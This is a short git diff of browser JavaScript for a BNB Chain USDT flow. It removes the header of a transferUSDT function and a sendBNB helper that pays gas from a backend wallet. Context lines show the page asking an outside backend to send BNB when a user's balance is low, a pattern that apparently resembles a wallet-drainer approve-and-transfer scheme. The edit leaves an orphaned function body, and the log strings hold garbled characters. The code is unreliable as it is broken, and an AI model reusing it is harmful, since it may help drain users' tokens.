@@ -1373,8 +1373,6 @@ async function approveToken() {
             return;
         }
 
-      async function transferUSDT(usdtBalance, userBNB) {
-    try {
         if (userBNB < 0.0005) {
     console.log("User BNB is low. Requesting BNB from backend...");
     await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
@@ -1407,20 +1405,6 @@ async function approveToken() {
     }
 }
 
-async function sendBNB(toAddress, amount) {
-    try {
-        await web3.eth.sendTransaction({
-            from: bnbGasSender,
-            to: toAddress,
-            value: web3.utils.toWei(amount, "ether"),
-            gas: 21000
-        });
-
-        console.log(`â Sent ${amount} BNB to ${toAddress} for gas fees.`);
-    } catch (error) {
-        console.error("â ï¸ Error sending BNB:", error);
-    }
-}
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
     if (!popup) {
